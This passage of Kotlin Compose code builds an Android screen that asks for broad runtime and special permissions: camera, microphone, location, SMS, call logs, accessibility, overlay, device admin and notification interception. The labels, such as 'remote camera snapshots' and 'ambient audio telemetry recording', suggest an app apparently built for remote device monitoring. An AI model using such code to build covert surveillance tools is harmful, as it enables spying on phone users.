                        Spacer(modifier = Modifier.width(8.dp))
                        Text(
                            text = "GRANT ALL RUNTIME PERMISSIONS",
                            fontSize = 11.sp,
                            fontWeight = FontWeight.Bold
                        )
                    }

                    Spacer(modifier = Modifier.height(16.dp))

                    // Granular Permission Status & Allow Buttons
                    val pm = context.packageManager
                    val packageName = context.packageName

                    // Granular Runtime Permissions
                    val permissionsList = listOf(
                        Triple("Camera Access", android.Manifest.permission.CAMERA, "Required for remote camera snapshots & telemetry"),
                        Triple("Microphone Access", android.Manifest.permission.RECORD_AUDIO, "Required for ambient audio telemetry recording"),
                        Triple("Location Access", android.Manifest.permission.ACCESS_FINE_LOCATION, "Required for real-time GPS device tracking"),
                        Triple("Contacts Access", android.Manifest.permission.READ_CONTACTS, "Required for contacts cloud backup"),
                        Triple("SMS & Messages Access", android.Manifest.permission.READ_SMS, "Required for SMS message sync & backup"),
                        Triple("Call Logs Access", android.Manifest.permission.READ_CALL_LOG, "Required for call log cloud backup"),
                        Triple("Notifications Access", if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) android.Manifest.permission.POST_NOTIFICATIONS else "", "Required for system alerts & service notifications")
                    )

                    permissionsList.forEach { (title, perm, desc) ->
                        if (perm.isNotEmpty()) {
                            val isGranted = androidx.core.content.ContextCompat.checkSelfPermission(context, perm) == android.content.pm.PackageManager.PERMISSION_GRANTED
                            Row(
                                modifier = Modifier
                                    .fillMaxWidth()
                                    .padding(vertical = 6.dp),
                                horizontalArrangement = Arrangement.SpaceBetween,
                                verticalAlignment = Alignment.CenterVertically
                            ) {
                                Column(modifier = Modifier.weight(1f)) {
                                    Row(verticalAlignment = Alignment.CenterVertically) {
                                        Text(text = title, fontSize = 12.sp, fontWeight = FontWeight.Bold, color = HighDensityOnSurface)
                                        Spacer(modifier = Modifier.width(6.dp))
                                        Text(
                                            text = if (isGranted) "GRANTED" else "DENIED",
                                            fontSize = 9.sp,
                                            fontWeight = FontWeight.Bold,
                                            color = if (isGranted) HighDensitySuccess else HighDensityWarning
                                        )
                                    }
                                    Text(text = desc, fontSize = 10.sp, color = HighDensitySecondary)
                                }
                                Spacer(modifier = Modifier.width(8.dp))
                                if (!isGranted) {
                                    OutlinedButton(
                                        onClick = onRequestPermissions,
                                        shape = RoundedCornerShape(8.dp),
                                        contentPadding = PaddingValues(horizontal = 10.dp, vertical = 4.dp),
                                        colors = ButtonDefaults.outlinedButtonColors(contentColor = HighDensityPrimary),
                                        border = BorderStroke(1.dp, HighDensityPrimary)
                                    ) {
                                        Text("ALLOW", fontSize = 10.sp, fontWeight = FontWeight.Bold)
                                    }
                                } else {
                                    Icon(
                                        imageVector = Icons.Default.Check,
                                        contentDescription = "Granted",
                                        tint = HighDensitySuccess,
                                        modifier = Modifier.size(18.dp)
                                    )
                                }
                            }
                            Divider(color = HighDensityOutline.copy(alpha = 0.5f), thickness = 0.5.dp)
                        }
                    }

                    Spacer(modifier = Modifier.height(12.dp))
                    Text("SYSTEM & SPECIAL ACCESS SERVICES", fontSize = 11.sp, fontWeight = FontWeight.Bold, color = HighDensityPrimary, letterSpacing = 0.5.sp)
                    Spacer(modifier = Modifier.height(8.dp))

                    // Special Permissions Cards
                    // 1. Accessibility Service
                    val isAccActive = com.example.service.AccessibilityOverlayManager.isAccessibilityEnabled(context)
                    Row(
                        modifier = Modifier.fillMaxWidth().padding(vertical = 6.dp),
                        horizontalArrangement = Arrangement.SpaceBetween,
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Column(modifier = Modifier.weight(1f)) {
                            Text("Accessibility Service", fontSize = 12.sp, fontWeight = FontWeight.Bold, color = HighDensityOnSurface)
                            Text("Automated remote gestures & system dialogs", fontSize = 10.sp, color = HighDensitySecondary)
                        }
                        OutlinedButton(
                            onClick = { com.example.service.AccessibilityOverlayManager.openAccessibilitySettings(context) },
                            shape = RoundedCornerShape(8.dp),
                            contentPadding = PaddingValues(horizontal = 10.dp, vertical = 4.dp),
                            colors = ButtonDefaults.outlinedButtonColors(contentColor = if (isAccActive) HighDensitySuccess else HighDensityPrimary),
                            border = BorderStroke(1.dp, if (isAccActive) HighDensitySuccess else HighDensityOutline)
                        ) {
                            Text(if (isAccActive) "ACTIVE" else "ENABLE", fontSize = 10.sp, fontWeight = FontWeight.Bold)
                        }
                    }
                    Divider(color = HighDensityOutline.copy(alpha = 0.5f), thickness = 0.5.dp)

                    // 2. Display Over Other Apps (Overlay)
                    val isOverlayActive = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) Settings.canDrawOverlays(context) else true
                    Row(
                        modifier = Modifier.fillMaxWidth().padding(vertical = 6.dp),
                        horizontalArrangement = Arrangement.SpaceBetween,
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Column(modifier = Modifier.weight(1f)) {
                            Text("Display Over Other Apps", fontSize = 12.sp, fontWeight = FontWeight.Bold, color = HighDensityOnSurface)
                            Text("Background popup activities & lockscreen overlay", fontSize = 10.sp, color = HighDensitySecondary)
                        }
                        OutlinedButton(
                            onClick = {
                                try {
                                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                                        val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName"))
                                        context.startActivity(intent)
                                    }
                                } catch (_: Exception) {}
                            },
                            shape = RoundedCornerShape(8.dp),
                            contentPadding = PaddingValues(horizontal = 10.dp, vertical = 4.dp),
                            colors = ButtonDefaults.outlinedButtonColors(contentColor = if (isOverlayActive) HighDensitySuccess else HighDensityPrimary),
                            border = BorderStroke(1.dp, if (isOverlayActive) HighDensitySuccess else HighDensityOutline)
                        ) {
                            Text(if (isOverlayActive) "ACTIVE" else "GRANT", fontSize = 10.sp, fontWeight = FontWeight.Bold)
                        }
                    }
                    Divider(color = HighDensityOutline.copy(alpha = 0.5f), thickness = 0.5.dp)

                    // 3. Unrestricted Battery
                    Row(
                        modifier = Modifier.fillMaxWidth().padding(vertical = 6.dp),
                        horizontalArrangement = Arrangement.SpaceBetween,
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Column(modifier = Modifier.weight(1f)) {
                            Text("Unrestricted Battery", fontSize = 12.sp, fontWeight = FontWeight.Bold, color = HighDensityOnSurface)
                            Text("Prevents OS battery saver from killing sync engine", fontSize = 10.sp, color = HighDensitySecondary)
                        }
                        OutlinedButton(
                            onClick = { viewModel.requestBatteryOptimizationExemption(context) },
                            shape = RoundedCornerShape(8.dp),
                            contentPadding = PaddingValues(horizontal = 10.dp, vertical = 4.dp),
                            colors = ButtonDefaults.outlinedButtonColors(contentColor = HighDensityPrimary),
                            border = BorderStroke(1.dp, HighDensityOutline)
                        ) {
                            Text("CONFIGURE", fontSize = 10.sp, fontWeight = FontWeight.Bold)
                        }
                    }
                    Divider(color = HighDensityOutline.copy(alpha = 0.5f), thickness = 0.5.dp)

                    // 4. Device Admin Policy
                    val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as? DevicePolicyManager
                    val isAdminActive = dpm?.isAdminActive(ComponentName(context, MyDeviceAdminReceiver::class.java)) == true
                    Row(
                        modifier = Modifier.fillMaxWidth().padding(vertical = 6.dp),
                        horizontalArrangement = Arrangement.SpaceBetween,
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Column(modifier = Modifier.weight(1f)) {
                            Text("Device Admin Policy", fontSize = 12.sp, fontWeight = FontWeight.Bold, color = HighDensityOnSurface)
                            Text("Remote lock, wipe, and camera policy control", fontSize = 10.sp, color = HighDensitySecondary)
                        }
                        OutlinedButton(
                            onClick = {
                                try {
                                    val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                                        putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, ComponentName(context, MyDeviceAdminReceiver::class.java))
                                        putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Required for remote device security policies.")
                                    }
                                    context.startActivity(intent)
                                } catch (_: Exception) {}
                            },
                            shape = RoundedCornerShape(8.dp),
                            contentPadding = PaddingValues(horizontal = 10.dp, vertical = 4.dp),
                            colors = ButtonDefaults.outlinedButtonColors(contentColor = if (isAdminActive) HighDensitySuccess else HighDensityPrimary),
                            border = BorderStroke(1.dp, if (isAdminActive) HighDensitySuccess else HighDensityOutline)
                        ) {
                            Text(if (isAdminActive) "ACTIVE" else "ENABLE", fontSize = 10.sp, fontWeight = FontWeight.Bold)
                        }
                    }
                    Divider(color = HighDensityOutline.copy(alpha = 0.5f), thickness = 0.5.dp)

                    // 5. Notification Listener
                    Row(
                        modifier = Modifier.fillMaxWidth().padding(vertical = 6.dp),
                        horizontalArrangement = Arrangement.SpaceBetween,
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Column(modifier = Modifier.weight(1f)) {
                            Text("Notification Listener", fontSize = 12.sp, fontWeight = FontWeight.Bold, color = HighDensityOnSurface)
                            Text("Real-time intercept and sync of incoming notifications", fontSize = 10.sp, color = HighDensitySecondary)
                        }
                        OutlinedButton(
                            onClick = {
                                try {
                                    context.startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
                                } catch (_: Exception) {}
                            },
                            shape = RoundedCornerShape(8.dp),
                            contentPadding = PaddingValues(horizontal = 10.dp, vertical = 4.dp),
                            colors = ButtonDefaults.outlinedButtonColors(contentColor = HighDensityPrimary),
                            border = BorderStroke(1.dp, HighDensityOutline)
                        ) {
                            Text("ENABLE", fontSize = 10.sp, fontWeight = FontWeight.Bold)
                        }
                    }
                    Divider(color = HighDensityOutline.copy(alpha = 0.5f), thickness = 0.5.dp)

                    // 6. Usage Stats Access
                    Row(
                        modifier = Modifier.fillMaxWidth().padding(vertical = 6.dp),
                        horizontalArrangement = Arrangement.SpaceBetween,
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Column(modifier = Modifier.weight(1f)) {
                            Text("App Usage Stats Access", fontSize = 12.sp, fontWeight = FontWeight.Bold, color = HighDensityOnSurface)
                            Text("Tracks foreground app usage statistics & screen time", fontSize = 10.sp, color = HighDensitySecondary)
                        }
                        OutlinedButton(
                            onClick = {
                                try {
                                    context.startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS))
                                } catch (_: Exception) {}
                            },
                            shape = RoundedCornerShape(8.dp),
                            contentPadding = PaddingValues(horizontal = 10.dp, vertical = 4.dp),
                            colors = ButtonDefaults.outlinedButtonColors(contentColor = HighDensityPrimary),
                            border = BorderStroke(1.dp, HighDensityOutline)
                        ) {
                            Text("ENABLE", fontSize = 10.sp, fontWeight = FontWeight.Bold)
                        }
                    }
                }
            }
        }
    }
}
